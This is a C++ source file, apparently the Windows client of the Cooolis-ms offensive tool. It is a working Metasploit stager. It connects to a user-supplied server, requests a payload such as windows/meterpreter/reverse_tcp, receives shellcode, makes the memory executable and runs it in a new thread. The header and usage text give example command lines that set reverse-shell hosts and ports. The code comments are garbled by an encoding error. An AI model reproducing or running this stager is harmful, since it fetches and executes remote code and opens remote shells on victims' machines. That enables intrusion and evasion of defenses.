/**************************
Code By Rvn0xsy
https://payloads.online
Email:rvn0xsy@gmail.com
Commandline e.g.>Cooolis-ms-x86.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.164.136,LPORT=8866 -H 192.168.164.136 -P 8899
***************************/

#include <WinSock2.h>
#include <iostream>
#include <Windows.h>
#include <winbase.h>
#include <tchar.h>
#include <Ws2tcpip.h>


#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib , "Advapi32.lib")


using namespace std;

CONST INT PAYLOAD_LEN = 200;

#pragma pack(4)
struct stager {
	char payload[PAYLOAD_LEN];
	char options[PAYLOAD_LEN];
};
#pragma pack()

// ���������Ϣ
VOID Usage() {
	cout << "[*]Usage : Cooolis-ms.exe -p [PAYLOAD] -s [PAYLOAD OPTIONS] -H [Stager Host] -P [Stager Port]" << endl;
	cout << "\t-p [PAYLOAD] \tMSF PAYLOAD TYPE" << endl;
	cout << "\t-s [PAYLOAD OPTIONS] \tMSF PAYLOAD OPTIONS" << endl;
	cout << "\t-H [Stager Host] \tCooolis-Server Host" << endl;
	cout << "\t-P [Stager Port] \tCoolis-Server Port" << endl;
	cout << "[*]Example : Pending-Msf.exe -p windows/meterpreter/reverse_tcp -s LHOST=192.168.117.1,LPORT=1122 -H 192.168.117.1 -P 4474" << endl;
}

// ��Unicodeת��ΪANSI
char* UnicodeToAnsi(const wchar_t* szStr)
{
	int nLen = WideCharToMultiByte(CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL);
	if (nLen == 0)
	{
		return NULL;
	}
	char* pResult = new char[nLen];
	WideCharToMultiByte(CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL);
	return pResult;
}


int WINAPI WinMain(  _In_  HINSTANCE hInstance,  _In_  HINSTANCE hPrevInstance,  _In_  LPSTR lpCmdLine,  _In_  int nCmdShow )
// int main()
{

	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	// ��ʼ��
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		cout << "[!]WSAStartup Error " << GetLastError() << endl;
		return 0;
	}

	PWCHAR * szArgList = NULL; // �����б�
	int argCount = NULL; // ��������
	DWORD port = NULL; // RPC �˿�
	PWCHAR ip = NULL; // RPC IP
	// ��ʼ��winsock
	HANDLE hThread = NULL; // �߳̾��
	SOCKET socks; // �׽���
	stager sd;		// �������ݽṹ��
	DWORD dwPayloadLength = 0; // shellcode ��С
	DWORD dwOldProtect; // �ڴ汣������
	struct sockaddr_in sock_addr; // �׽�������
	// ��ȡ�����в�����·��
	
	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // �����׽���
	ZeroMemory(sd.payload, PAYLOAD_LEN); // ����ڴ�
	ZeroMemory(sd.options, PAYLOAD_LEN); // ����ڴ�

	DWORD dwSdSizeof = sizeof(sd);
		// ��������ں��ţ���Ϊ�״����У���Ҫ���ղ���
		// ��������
		PWCHAR pstrPayload = NULL;
		PWCHAR pstrOptions = NULL;
		szArgList = CommandLineToArgvW(GetCommandLine(),&argCount);
		// �������С��9�������˳�
		if (szArgList == NULL || argCount < 9)
		{

			Usage();
			ExitProcess(0);
		}

		for (INT i = 0; i < argCount; i++)
		{
			if (lstrcmpW(szArgList[i], TEXT("-p")) == 0) {
				pstrPayload = szArgList[++i];
				
				char* cPay = UnicodeToAnsi(pstrPayload);

				CopyMemory(sd.payload, cPay, strlen(cPay));
			}
			else if (lstrcmpW(szArgList[i], TEXT("-s")) == 0)
			{

				pstrOptions = szArgList[++i];
				
				char* opt = UnicodeToAnsi(pstrOptions);
				CopyMemory(sd.options, opt, strlen(opt));

			}
			else if (lstrcmpW(szArgList[i], TEXT("-H")) == 0)
			{
				ip = szArgList[++i];
				
			}
			else if (lstrcmpW(szArgList[i], TEXT("-P")) == 0)
			{
				PWCHAR wport = szArgList[++i];
				
				port = _wtoi(wport);
			}
			else {
				Usage();
			}
	}

	InetPtonW(AF_INET, ip, &(sock_addr.sin_addr)); // ת��IP��ַ
	sock_addr.sin_family = AF_INET;		// �׽�������
	sock_addr.sin_port = htons(port);  // �׽��ֶ˿�
	// �����׽���
	while (connect(socks, (struct sockaddr*) & sock_addr, sizeof(sock_addr)) == SOCKET_ERROR) {
		cout << "[!]Connect error ! " << GetLastError() << endl;
		Sleep(5000);
		continue;
	}

	// �����ֽ���
	send(socks, (char*)& sd, sizeof(sd), 0);

	// ����Shellcode����
	recv(socks, (char*)& dwPayloadLength, sizeof(DWORD), 0);

	// �ȴ�����ִ��
	Sleep(3000);

	// �����ڴ�ҳ
	CHAR* pSpace = (CHAR*)VirtualAlloc(NULL, dwPayloadLength, MEM_COMMIT, PAGE_READWRITE);

	// ��Shellcode�����ڴ�ҳ
	recv(socks, pSpace, dwPayloadLength,0);

	// �ر��׽���
	closesocket(socks);
	// ���ڴ�ҳ���Ը���Ϊ��ִ��
	VirtualProtect(pSpace, dwPayloadLength, PAGE_EXECUTE_READ, &dwOldProtect);
	// �����̣߳�ִ��Shellcode
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pSpace, NULL, NULL, NULL);
	// �ȴ��߳�ִ�����
	WaitForSingleObject(hThread, INFINITE);
	// �ͷ��ڴ�
	VirtualFree(hThread, 0, MEM_RELEASE);
	return 0;
}

